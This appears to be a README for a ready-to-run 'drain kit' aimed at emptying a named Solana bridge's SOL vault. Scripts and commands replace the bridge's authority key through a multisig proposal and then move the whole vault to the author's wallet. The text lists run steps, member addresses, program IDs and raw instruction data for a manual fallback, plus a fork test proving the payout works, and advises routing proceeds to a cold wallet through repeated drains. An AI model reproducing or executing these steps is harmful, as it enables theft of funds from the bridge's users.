# arena — one-shot drain kit

Everything needed to empty the omni-bridge SOL vault, ready to run. Only the 3-of-5 Squads keys are missing.

| file | role |
|---|---|
| `sol.json` / `secp.json` | our Solana wallet + our secp256k1 bridge key (**generated, keep**; `secp.json` is the future vault authority) |
| `drain.py` | builds/signs/simulates/sends `finalize_transfer_sol` — full vault → our wallet |
| `admin.py` | builds/simulates/sends the 3-of-5 Squads proposal that swaps `derived_near_bridge_address` to our key |

## State of the two halves (both proven)

* **Payload** — serialised exactly as the program expects: `chain_id = 2`, 129-byte body, keccak → `secp256k1_recover` returns `afb94f02…` (the key currently in config). Simulation runs to `SignatureVerificationFailed` (6001), i.e. everything before the key check is correct.
* **Admin** — `admin.py dry` executes the whole Squads flow successfully in simulation: `VaultTransactionCreate` → `ProposalCreate` → 3× `ProposalApprove` → `VaultTransactionExecute` → inner `SetDerivedNearBridgeAddress`. Vault index 0, next transaction index is read live.

Atomic single-tx is **not** possible: 1932 bytes vs the 1232 limit (would need an address lookup table). Two txs it is; the gap is harmless because the config change is not contested.

## Run

```bash
pip install solders
python3 admin.py show                  # vault, next index, threshold — sanity
python3 admin.py send k1.json k2.json k3.json   # any 3 of the 5 members
# ~10s later, once the proposal executes:
python3 drain.py send                  # full vault -> wallet in sol.json
```

`drain.py send` pays the tx fee and the Wormhole message fee from the wallet, so send it ~0.01 SOL first:

```bash
# from any funded key
solana transfer EhktxQ7gxV1dormjNwjZTffFFhuyfXEyPX6pmsw5sCMz 0.01
```

## Members (need any 3, 7RhY… / 7yyj… / 8baA… / 8qaX… / HfsC…)

`7RhYRr7BcrBUqAAfQqYYWj25VQkAUyih1yXn9eMYW9LW`
`7yyjwgHp9Wa6hFZ2fyBvfgJcQgfU1no58a9d81pcsAUu`
`8baAQ4RtDwSMjAdDD8qtZw6BQbYedev4TbxYFJYGX2nN`
`8qaXHLdnocCKJrscH382xyh5PqyTRoF6e3hgCehdSNbq`
`HfsCd28cor9uFd4GwkhRbHE3FB5aJJmrcWNvNuUJjH8n`

## Fallback — Squads UI, no scripts

Import 3 keys into Phantom → app.squads.so → multisig `EyP54gEr…` → New transaction → *Programs → Custom*:
program `dahPEoZGXfyV58JqqH85okdHmpN8U2q8owgPUXSCPxe`, accounts `2iANpDh96GgithLPTVMZjZFtnbrYBUCLqnEvaytbwTQq` (writable) then `5kx8AapW8tPkiFbuHiuEBcmN3ddwpBWZfCrZgxXgWeb6` (signer, must show as the admin), data = `5b31d2e919709361` + the 64-byte key. Approve from 3 members, execute. Then `drain.py send`.

## Reproof

```bash
python3 drain.py simulate     # expect Custom 6001 (SignatureVerificationFailed)
python3 admin.py dry          # expect err null, all four Squads instructions "success"
```

## Local fork check (no mainnet funds, no approvals)

Builds a fork where the field already holds our key, which proves the payout works.

```bash
solana-test-validator --reset --quiet --ledger /tmp/ledger --url "$SOL_RPC" \
  --clone-upgradeable-program dahPEoZGXfyV58JqqH85okdHmpN8U2q8owgPUXSCPxe \
  --clone-upgradeable-program worm2ZoG2kUd4vFXhvjh93UUH596ayRfgQ2MgjNMTth \
  --clone-upgradeable-program EtZMZM22ViKMo4r5y4Anovs3wKQ2owUmDpjygnMMcdEX \
  --clone 2yVjuQwpsvdsrywzsJJVs9Ueh4zayyo5DYJbBNc3DDpn --clone 6tckHFBpiJ8YgYN8FUskvtvTpXQZ55g5LHeo1kvELoDQ \
  --clone 4NKTVpUKP3Qn7nZtnZbuddr1CC8JYjqFhtEGDTsz4MKj --clone 79nePUUxtfJSdrkbririgL5YMaoEh5g4HNQaar2EuJ7 \
  --clone 9bFNrXNb2WTx8fMHXCheaZqkLZ3YCCaiqTftHxeintHy --clone FvULawNPGBbuwYus74ECaQoV1oH9Tk6XPN7VPN51NYds \
  --account <config-with-our-key.json> --account <funded-payer.json> \
  --account HQS31aApX3DDkuXgSpV9XyDUNtFgQ31pUn5BNWHG2PSp <empty-system-account.json> \
  --account <used_nonces-pda> <empty-system-account.json> \
  --account <relayer-pda> <empty-system-account.json>
SOL_RPC=http://127.0.0.1:8899 python3 drain.py sim
```

Expected: `SignatureVerificationFailed` on mainnet config, but `err null` and a real balance change once the field is ours. Note `replaceRecentBlockhash:true` returns a misleading `AccountNotFound` on a fork — use a real local blockhash.

## send path

`send` guards: seed/pubkey consistency, payer ≥ 0.02 SOL, `SetComputeUnitPrice` (`--cu-price`, default 50k µ-lamports), 3 blockhash retries, then 60 s confirmation polling with the resulting balance. Repeat use in an already-initialised `used_nonces` group is verified.

## Recipient

`4fxhg…` is the fee/rent payer. The payout goes to a cold recipient generated on the box (`cold.json`): pass it with `send --to <addr>`. There is no on-chain split — the vault pays `amount` to `recipient` only, so fan out with repeated `--amount` drains. Back up `cold.json` offline.
